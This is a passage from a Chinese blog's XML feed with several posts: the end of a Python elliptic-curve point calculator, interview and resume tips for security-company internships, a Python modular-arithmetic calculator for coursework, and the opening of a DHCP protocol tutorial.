class="token operator">-</span>y1<span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">(</span>x2<span class="token operator">-</span>x1<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>        L<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>y2<span class="token operator">-</span>y1<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span>x2<span class="token operator">-</span>x1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>p    <span class="token keyword">else</span><span class="token punctuation">:</span>        L<span class="token operator">=</span>myfmod<span class="token punctuation">(</span><span class="token punctuation">(</span>y2<span class="token operator">-</span>y1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>x2<span class="token operator">-</span>x1<span class="token punctuation">)</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"斜率L=%d"</span><span class="token operator">%</span> L<span class="token punctuation">)</span>    x3<span class="token operator">=</span><span class="token punctuation">(</span>pow<span class="token punctuation">(</span>L<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">-</span>x1<span class="token operator">-</span>x2<span class="token punctuation">)</span><span class="token operator">%</span>p    y3<span class="token operator">=</span><span class="token punctuation">(</span>L<span class="token operator">*</span><span class="token punctuation">(</span>x1<span class="token operator">-</span>x3<span class="token punctuation">)</span><span class="token operator">-</span>y1<span class="token punctuation">)</span><span class="token operator">%</span>p    <span class="token keyword">return</span> x3<span class="token punctuation">,</span>y3<span class="token keyword">def</span> <span class="token function">tongG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请输入椭圆曲线的a:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    b<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请输入椭圆曲线的b:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请输入模数p:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    x<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请输入生成元G的x坐标:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    y<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请输入生成元G的y坐标:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    x3<span class="token punctuation">,</span>y3<span class="token operator">=</span>muchG<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>p<span class="token punctuation">,</span>a<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2G=(%d,%d)"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>x3<span class="token punctuation">,</span>y3<span class="token punctuation">)</span><span class="token punctuation">)</span>    f<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token string">"按任意键继续"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">yiG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请输入模数p:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    x1<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请输入P的x坐标:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    y1<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请输入P的y坐标:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    x2<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请输入Q的x坐标:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    y2<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请输入Q的y坐标:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    x3<span class="token punctuation">,</span>y3<span class="token operator">=</span>diffG<span class="token punctuation">(</span>x1<span class="token punctuation">,</span>y1<span class="token punctuation">,</span>x2<span class="token punctuation">,</span>y2<span class="token punctuation">,</span>p<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"P+Q=(%d,%d)"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>x3<span class="token punctuation">,</span>y3<span class="token punctuation">)</span><span class="token punctuation">)</span>    f<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token string">"按任意键继续"</span><span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">while</span><span class="token punctuation">(</span>flag<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1.同G"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2.求异G"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"0.退出"</span><span class="token punctuation">)</span>    flag<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请选择："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        tongG<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> flag<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>        yiG<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><br><br></p><h2 id="03-实现效果"><a href="#03-实现效果" class="headerlink" title="03 实现效果"></a>03 实现效果<br></h2><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200703142913431.png#pic_center" alt=""><br>通过以上描述，我们得知 p = 11， a = 1 ， b = 6 ，x = 2 ，y =7 ，m = 7 ，现在已确认点乘运算 2（2,7）=（5,2），那么下面我们来验证python小程序的正确性。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200703143545346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>验证成功<del>~</del></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应用 </tag>
            
            <tag> 椭圆曲线加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Get Offer —— 简历投递与加分细节</title>
      <link href="/2020/07/20/get-offer-jian-li-tou-di-yu-jia-fen-xi-jie/"/>
      <url>/2020/07/20/get-offer-jian-li-tou-di-yu-jia-fen-xi-jie/</url>
      
        <content type="html"><![CDATA[<p><font color='blue'> 点赞后看，养成习惯<br>喜欢的话 可以点个关注哟<br>你们的点赞支持对博主们来说很重要哦 ！！！<br></font></p><p>本篇文章帮你逐个击破以下几个问题：</p><p><strong>01 靠谱的简历投递方式有哪些？</strong> </p><p><strong><strong>02 接到对方的电话面试通知，你在忙该怎么办？</strong></strong></p><p><strong>03  面试时，一开始你不知道说些什么，该怎么办？</strong></p><p><strong>04 手忙脚乱？有哪些商务礼仪需要注意？</strong></p><p><strong>05 反向提问，老是关心有无加班费？有无节假日？</strong></p><p><strong>06  面试结束，坐以待毙等结果？</strong></p><p>@<a href="为方便您的阅读，可点击下方蓝色字体，进行跳转↓↓↓">TOC</a></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200718104822798.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""></p><h2 id="00-前情提要"><a href="#00-前情提要" class="headerlink" title="00 前情提要"></a>00 前情提要</h2><p>本人从6月23号开始写简历，之后投简历，很幸运地通过了几家公司的简历筛选，之后陆陆续续参加了多次笔试，再之后进行了面试，截止今日已经过去了接近一个月。</p><p>在这段时间里，我先后投递了7家公司，其中包括奇安信、绿盟科技、深信服、安恒信息、中电福富、天融信、永信至诚。<font color='red'>由于投递简历的时间较晚，经学姐了解，奇安信、深信服、绿盟科技的网申渠道招聘人数已满，因此很遗憾未能进入面试阶段。</font><font color='blue'>所以如果你还不是大三的学生，想找实习的话，一定要在大三下学期4月份就开始关注招聘消息呀~</font></p><p>而6月底之后开展的4家公司的网申，如中电福富、天融信、安恒信息以及永信至诚，我的简历均通过筛选，非常开心！！！</p><p>当然，我在简历上也确实是花了功夫。我陆陆续续请教了4名学长以及3名身边的同学，综合参考网上资料，花了7天时间，总算整理包装出自己的简历。之后有机会的话，会写文章和大家分享写简历的小技巧，<strong>想了解的伙伴不妨点个关注，不迷路哟。</strong></p><p>那么今天，我就先来简单分享一下，我在准备面试的时候了解到的一些小技巧。</p><p><br><br></p><h2 id="01-靠谱的简历投递渠道"><a href="#01-靠谱的简历投递渠道" class="headerlink" title="01 靠谱的简历投递渠道"></a>01 靠谱的简历投递渠道</h2><p>有关于，简历投递渠道，我目前使用到的渠道大致有三种。<br><br></p><h2 id="1-1-高校人才招聘网站"><a href="#1-1-高校人才招聘网站" class="headerlink" title="1.1 高校人才招聘网站"></a>1.1 高校人才招聘网站</h2><p>相信不少好的高校，都会有自己的人才招聘网站、学生就业创业指导中心。大家不妨搜搜当地知名高校的相关网站消息。</p><p><font color='blue'>拿我例子，我是福州地区，所以我选择的是福大人才招聘网</font>：<a href="http://www.fjrclh.com/" target="_blank" rel="noopener external nofollow noreferrer">http://www.fjrclh.com/</a><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200718103035103.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""></p><p>其中，中电福富公司的实习生招聘消息，我便是通过这个渠道寻找到的。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200718103044987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""></p><h2 id="1-2-各大招聘网站"><a href="#1-2-各大招聘网站" class="headerlink" title="1.2 各大招聘网站"></a>1.2 各大招聘网站</h2><p>就IT行业来说，我使用的互联网招聘网站如下：</p><p><font color='blue'>BOSS直聘</font>：可以<strong>事先和公司相关人员进行沟通</strong>，推荐~~</p><p><font color='blue'>牛客网</font>：有大量的<strong>内推名额</strong>，<strong>面试笔试题库</strong>，有空可以经常逛逛~~</p><p><font color='blue'>猎聘/拉钩网</font>：我使用的不多，不过可以作为上述两者的补充。</p><p>通过这种途径，我了解到了4家我投递公司的招聘情况。<br><br></p><h2 id="1-3-公司官网-公司招聘微信公众号（推荐）"><a href="#1-3-公司官网-公司招聘微信公众号（推荐）" class="headerlink" title="1.3 公司官网/公司招聘微信公众号（推荐）"></a>1.3 公司官网/公司招聘微信公众号（推荐）</h2><p>基本上互联网大厂都会有自己的官方网站以及微信公众号，瞄准你心仪的公司，<font color='blue'>主动搜索官方网站以及微信公众号，相信你会有收获的。</font></p><p>而且就我个人感觉，这种方式效率高且印象好。</p><p>效率高指的是，HR通常浏览官方渠道投递简历的次数会多于各大招聘网站。<br><font color='blue'>举个例子，HR可能每隔一天就登上自家官网看看后台简历投递情况，而每隔一周才登上BOSS直聘看看有无后台投递简历。</font></p><p>印象好指的是，HR可能会觉得你小伙子不错，特意来到我家官网投简历，<strong>求职态度很不错。</strong></p><p>我通过这种方式，先后添加了绿盟科技招聘、安恒fan、福富公司招聘、深信服招聘等，之后还会持续关注的。<br><br><br></p><h2 id="02-接到电话通知的完美回答"><a href="#02-接到电话通知的完美回答" class="headerlink" title="02 接到电话通知的完美回答"></a>02 接到电话通知的完美回答</h2><p>HR筛选简历之后，通常来说，如果你的简历通过筛选了，她就会打电话通知你，进行面试时间的确认。</p><p>如果你接电话的时候，刚好方便，那么对方可能直接开始面试。这是<strong>顺理成章</strong>的。<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200718103114960.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""></p><p><font color='red'>但是要是刚巧你在地铁上，接电话的时候附近嘈杂，根本听不清对方说话。或者你手头上要紧急的事情需要处理，那你该怎么办呢?</font></p><p>不排除有的人，可能情急之下硬生生回复：<font color='red'>我现在忙，之后再说</font>。按这么回复，之后再说不好说，印象给对方确实不好。</p><p>那我们该怎么办呢？</p><p>首先记住两点：良好的电话沟通有两个特点，<font color='blue'>一是信号好，二是面带微笑。</font></p><p>所以如果我们现在周遭嘈杂或者有事再忙，我们要以坚定、有着微笑感觉回复道：<br><font color='blue'>您好，我现在附近比较吵，害怕会耽误和您的沟通。你看，您什么时候方便，我之后方便了给你回拨过去。</font></p><p>相信相比之下，采取这种回复方式，会比第一种更能留给面试官良好的印象。</p><p><br><br></p><h2 id="03-少不得的寒暄问候"><a href="#03-少不得的寒暄问候" class="headerlink" title="03 少不得的寒暄问候"></a>03 少不得的寒暄问候</h2><p>心理学上有一个首因效应，即第一印象的重要性。<font color='blue'>当我们与客人、亲戚见面，我们通常少不了一番寒暄，互相嘘寒问暖一番。</font></p><p>面试的时候也是这样，当然，你可以做也可以不做。<br>毕竟确实有人觉得尴尬开不了口，也有人觉得很自然。<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020071810312697.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""></p><p>那如果你要寒暄的话，你可以从公司角度出发。</p><p>假如你是线下面试的话，你打开话题的第一句可以是：<font color='blue'>最近天气挺热的，不过我进来的时候就感到一股凉爽。看到公司的前台都带着笑容，就感觉每个公司成员都神采奕奕的，都非常有工作的热情与活力，我特别喜欢来这种公司学习。</font></p><p><font color='blue'>然后适可而止，聆听面试官的回复，引出自我介绍等。</font></p><p>相信，透过这句话，面试官能感受到你的热情与你的态度。<strong>加分！！！</strong><br><br><br></p><h2 id="04-良好的举止仪表展示"><a href="#04-良好的举止仪表展示" class="headerlink" title="04 良好的举止仪表展示"></a>04 良好的举止仪表展示</h2><p>基础的商务礼仪，其实能力要求不高，实际上就是知道与不知道的差别。在这里，我简单列举一下，自己学习到的一些小细节。</p><p>如果你在会议厅坐在等候，面试官进来的时候，<font color='red'>你最好不要一直愣在哪里，一动不动。</font>最好能够，<font color='blue'>面带微笑，微微起身点头示意。</font><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200718103139382.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70" alt=""></p><p>面试过程中，<font color='blue'>保持与面试官的眼神交流，</font><font color='red'>切忌躲躲闪闪，让人觉得你心里有鬼。</font></p><p>面试结束后，起身礼貌地表示感谢，转身离开前，<font color='blue'>记得把椅子归还原位</font>，如果对方有给一次性茶水杯，那么你可以<font color='blue'>顺势拿过茶水杯，自己扔掉。</font><br><br><br></p><h2 id="05-体现上进心的反向提问"><a href="#05-体现上进心的反向提问" class="headerlink" title="05 体现上进心的反向提问"></a>05 体现上进心的反向提问</h2><p>先说说什么是反向提问呢？他会怎么问你呢？</p><p>这通常出现在面试差不多了，面试官问你说：<strong>刚刚通过我这么些表述，你还有什么东西要问我的么？</strong></p><p>就这么一句，实际上就是让你问他问题。<strong>这看起来不是在考你，而实际上就是在考你，侧面看看你到底关注的是啥，就看你有没有这个意识了。</strong><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200718103150581.jpg" alt=""></p><p>比如说：你问<br><font color='red'>咱们公司加班不？ 哦，一问知道了，原来你小子怕加班。</font><br><font color='red'>咱公司经常出差不？ 哦，你小子怕出差。</font><br><font color='red'>咱们公司人际关系咋样啊？ 哦，你小子处理不好人际关系。</font></p><p>那我们该如何反向提问呢？我来分享分享，我面试过程中<strong>反向提问的套路问题</strong>。</p><p><font color='blue'>如果我能够加入贵公司，我想了解一下我这个岗位的上升空间是什么？公司有没有提供入职培训呢？</font></p><p><font color='blue'>我所在的这个部门，在公司里发展的怎么样，在公司里处于一个什么样的环节和位置啊？我个人能发挥那些作用啊</font></p><p><br><br></p><h2 id="06-展现求职意图的结束跟进"><a href="#06-展现求职意图的结束跟进" class="headerlink" title="06 展现求职意图的结束跟进"></a>06 展现求职意图的结束跟进</h2><p>好了，面试结束之后，是不是头一扭就回去等通知了呢？</p><p>在这里我建议你，<font color='blue'>要做另一个动作就是加HR或者部门经理的微信，掌握一定的主动权。</font><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200718103202754.jpg" alt=""></p><p><strong>为什么加她微信呢?</strong><br>是因为建立联系</p><p><strong>为什么建立联系?</strong><br>是为了隔天后继续跟进你的面试结果，而不是干巴巴听HR说回去等消息，就真的整整等了十几天。</p><p><strong>那怎么跟进呢?</strong><br>不断用微信的方式跟他表态说对公司的向往，<font color='blue'>每隔几天就问一问，我有机会么？能不能再给一次面试的机会?</font></p><p><font color='blue'>相信，这会让你掌握一定的主动权。</font></p><p> <br> <br><br>看到这，不排除也有个别人觉得：<strong>我是搞技术的，整这玩意干么？技术牛逼就是一切。</strong></p><p>那么我想说：你是对的，对于搞技术的我们来说，技术到达一定程度，属实就是牛逼。其中典型的代表就是乔布斯——一个传奇的男人。</p><p>也有人说技术是1，态度是0，这没毛病！<br>那么在技术相当的情况下，把握一些小细节，从10到100岂不妙哉。</p><p><br><br><br><br>最后，如果本文对你有所帮助，<strong>希望可以点个赞支持一下</strong>。你们的鼓励将会是博主原创的动力。</p><p><strong>当然，我也仅有几次的面试经验，以上观点仅供参考。<br>文章中如有不对的，有失偏颇的地方，欢迎各位互联网朋友、HR朋友指点。</strong><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200616062636626.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 面试经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 简历投递 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python——验证密码学常见运算</title>
      <link href="/2020/07/20/python-yan-zheng-mi-ma-xue-chang-jian-yun-suan/"/>
      <url>/2020/07/20/python-yan-zheng-mi-ma-xue-chang-jian-yun-suan/</url>
      
        <content type="html"><![CDATA[<h2 id="00-前情提要"><a href="#00-前情提要" class="headerlink" title="00 前情提要"></a>00 前情提要</h2><p>最近处于期末复习阶段，对于现代密码学这门学科来说，解题过程中经常出现几种运算的身影，其中包括整数模运算、分数模运算、乘法逆元运算等。</p><p>而为方便检验自己的笔算结果，这里使用一个简单的python程序验证计算结果。<br><br></p><h2 id="01-实现背景"><a href="#01-实现背景" class="headerlink" title="01 实现背景"></a>01 实现背景</h2><p>先来简单举几个笔算的例子，既方便大家理解，也方便用于验证python脚本的正确性。</p><p>整数模运算，如 2 mod 5 = 2</p><p>分数模运算，如 1/3 mod 5 = 2</p><p>乘法逆元运算，1 关于 6 的乘法逆元为  7<br><br></p><h2 id="02-实现源码"><a href="#02-实现源码" class="headerlink" title="02 实现源码"></a>02 实现源码</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">ny</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>z<span class="token punctuation">)</span><span class="token punctuation">:</span>    k<span class="token operator">=</span><span class="token number">1</span>    e<span class="token operator">=</span>e<span class="token operator">%</span>z    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span>e<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        k<span class="token operator">=</span>k<span class="token operator">+</span><span class="token number">1</span>    d<span class="token operator">=</span>int<span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span>e<span class="token punctuation">)</span>    <span class="token keyword">return</span> d<span class="token keyword">def</span> <span class="token function">myfmod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请输入分子："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    b<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请输入分母："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    c<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请输入模："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    g<span class="token operator">=</span>a    a<span class="token operator">=</span>a<span class="token operator">%</span>c    d<span class="token operator">=</span><span class="token punctuation">(</span>a<span class="token operator">*</span>ny<span class="token punctuation">(</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span>c    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"分数%d/%d模%d的余数为%d"</span><span class="token operator">%</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span>    f<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token string">"按任意键继续"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">mymod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请输入整数："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    b<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请输入模："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"整数数%d模%d的余数为%d"</span><span class="token operator">%</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>a<span class="token operator">%</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>    f<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token string">"按任意键继续"</span><span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">while</span><span class="token punctuation">(</span>flag<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"欢迎使用密码学计算器"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1.求整数模"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"2.求分数模"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"3.求乘法逆元"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"0.退出"</span><span class="token punctuation">)</span>    flag<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请选择："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        mymod<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> flag<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>        myfmod<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> flag<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">:</span>        a<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请输入整数a："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        b<span class="token operator">=</span>int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"请输入整数b："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'{a}关于{b}的乘法逆元为{ny(a,b)}'</span><span class="token punctuation">)</span>        f<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token string">"按任意键继续"</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cls'</span><span class="token punctuation">)</span></code></pre><p><br><br></p><h2 id="03-实现效果"><a href="#03-实现效果" class="headerlink" title="03 实现效果"></a>03 实现效果</h2><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200703141047697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020070314105769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200703141359356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应用 </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络——DHCP协议详解</title>
      <link href="/2020/07/20/ji-suan-ji-wang-luo-dhcp-xie-yi-xiang-jie/"/>
      <url>/2020/07/20/ji-suan-ji-wang-luo-dhcp-xie-yi-xiang-jie/</url>
      
        <content type="html"><![CDATA[<p> <font color='blue'> 点赞后看，养成习惯<br>喜欢的话 可以点个关注哟<br>你们的点赞支持对博主们来说很重要哦 ！！！<br></font><br><strong>本文将针对以下问题逐条进行解答：</strong></p><p>01 DHCP协议是什么？</p><p>02 客户端与服务端处于<strong>同一广播域内</strong>，DHCP协议如何工作的？</p><p>03 客户端和服务端<strong>不在同一网段</strong>，客户端如何通过广播发现服务器？</p><p>04 客户端和服务端不在同一网段时，服务器为什么能给客户端分配到<strong>所属网段的IP地址</strong>？</p><p>05 DHCP有哪些<font color='red'><em>安全漏洞</em> </font>？</p><p>06 如何解决DHCP的安全漏洞呢？<br><br></p><p>@<a href="为方便您的阅读，可点击下方蓝色字体，进行跳转↓↓↓">TOC</a><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620101224690.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h1 id="01-DHCP协议简介"><a href="#01-DHCP协议简介" class="headerlink" title="01 DHCP协议简介"></a>01 DHCP协议简介</h1><p>一台电脑，需要被分配到IP地址、网络掩码、缺省网关、DNS服务器IP才算获得了完整的IP参数。那么这些IP参数，是不是需要我们一个个去用户电脑里手动配置呢？</p><p>答案是不用的，TCP/IP协议的发明者，为了让TCP/IP协议简单易用，发明了一个自动化配置工具，这就是DHCP(动态主机配置协议)。</p><p><font color='blue'> 这相当于，人类最初想要点火，需要手动钻木取火，而现在只需要一个简单的打火机，按钮一按便可以点火一样。</font><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620101234572.gif#pic_center" alt=""><br><br><br></p><h1 id="02-客户端与服务端处于同一广播域内，DHCP协议工作机制"><a href="#02-客户端与服务端处于同一广播域内，DHCP协议工作机制" class="headerlink" title="02 客户端与服务端处于同一广播域内，DHCP协议工作机制"></a>02 客户端与服务端处于同一广播域内，DHCP协议工作机制</h1><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620101245604.jpg#pic_center" alt=""><br>1、客户端发现服务端   （<font color='blue'> 